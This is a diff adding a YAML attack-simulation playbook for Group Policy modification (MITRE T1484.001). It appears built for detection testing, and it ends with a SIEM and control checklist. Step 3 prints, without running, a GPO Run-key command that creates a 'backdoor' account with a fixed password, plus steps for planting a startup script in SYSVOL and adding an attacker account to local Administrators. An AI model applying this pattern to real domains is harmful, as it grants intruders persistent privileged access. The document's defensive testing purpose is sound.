@@ -1,0 +1,94 @@
+id: T1484.001_domain_policy_modification_group_policy
+name: "Domain or Tenant Policy Modification — Group Policy Modification"
+mitre_technique: "T1484.001"
+mitre_tactic: "privilege_escalation"
+description: >
+  Adversaries with Domain Admin or delegated GPO permissions modify Group Policy
+  Objects to execute malicious code under SYSTEM context across all domain-joined
+  machines, or to weaken security controls that prevent privilege escalation.
+  Common techniques: add a startup script to a GPO that runs as SYSTEM, disable
+  Windows Defender via GPO policy, add attacker-controlled accounts to local
+  Administrators via Restricted Groups GPO, or modify password policies to allow
+  weaker credentials. GPO changes propagate to all targeted machines at the next
+  refresh interval (default 90 minutes).
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1484/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1484.001 — Group Policy Modification simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Enumerate GPOs and identify modification targets"
+    command: |
+      Write-Host "[PAS] GPO enumeration for modification targeting:"
+      Write-Host "[PAS] Method 1: gpresult /R (applied GPOs)"
+      gpresult /R /SCOPE COMPUTER 2>&1 | Select-String "Applied Group Policy" -Context 0,5 |
+          Select-Object -First 3 | ForEach-Object { Write-Host "  $_" }
+
+      Write-Host "[PAS] Method 2: SYSVOL GPO path enumeration"
+      $domain = $env:USERDNSDOMAIN
+      if ($domain) {
+          $sysvol = "\\$domain\SYSVOL\$domain\Policies"
+          if (Test-Path $sysvol -ErrorAction SilentlyContinue) {
+              $gpos = Get-ChildItem $sysvol -Directory -ErrorAction SilentlyContinue
+              Write-Host "  GPOs in SYSVOL: $($gpos.Count)"
+              Write-Host "  Target: Default Domain Policy {31B2F340-016D-11D2-945F-00C04FB984F9}"
+          }
+      }
+      Write-Host "[PAS] GPO modification requires: Group Policy Creator Owners, Domain Admins, or delegated GPO rights"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate GPO startup script addition — SYSTEM execution vector"
+    command: |
+      Write-Host "[PAS] GPO startup script injection pattern:"
+      Write-Host "[PAS] Real attack:"
+      Write-Host "  1. Import-Module GroupPolicy"
+      Write-Host "  2. Set-GPRegistryValue -Name 'Default Domain Policy' -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'PAS' -Type String -Value 'cmd.exe /c net user backdoor Pass123 /add'"
+      Write-Host "  3. Or: copy malicious script to \\domain\SYSVOL\domain\Policies\{GUID}\Machine\Scripts\Startup\"
+      Write-Host ""
+
+      # Generate SYSVOL access telemetry
+      $domain = $env:USERDNSDOMAIN
+      if ($domain) {
+          $startupPath = "\\$domain\SYSVOL\$domain\Policies"
+          Get-ChildItem $startupPath -ErrorAction SilentlyContinue | Out-Null
+          Write-Host "[PAS] SYSVOL Policies path accessed — GPO modification reconnaissance"
+      }
+
+      Write-Host "[PAS] Restricted Groups GPO attack:"
+      Write-Host "  Computer Config -> Policies -> Windows Settings -> Security Settings -> Restricted Groups"
+      Write-Host "  Add: Administrators -> attacker_account (propagates to all domain machines)"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — SYSVOL GPO path write access, gpupdate.exe forced refresh, Event 5136 (AD object modified)"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1484.001 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Event ID 5136 on DC: directory service object modified — GPO object changed"
+  - "File event: SYSVOL GPO path write by non-GPMC process"
+  - "Sentinel: SecurityEvent | where EventID == 5136 and ObjectClass == 'groupPolicyContainer'"
+  - "Sentinel: DeviceFileEvents | where FolderPath contains 'SYSVOL' and FolderPath contains 'Scripts' and ActionType == 'FileCreated'"
+  - "Defender for Identity: 'Group Policy modification suspicious attributes'"
+  - "CONTROL CHECK: GPO modification restricted to Domain Admins and named GPO admin accounts — no broad delegation"
+  - "CONTROL CHECK: GPO change management process — all GPO changes require a change ticket and review"
+  - "CONTROL CHECK: Audit SYSVOL write permissions quarterly — flag any non-standard write access"
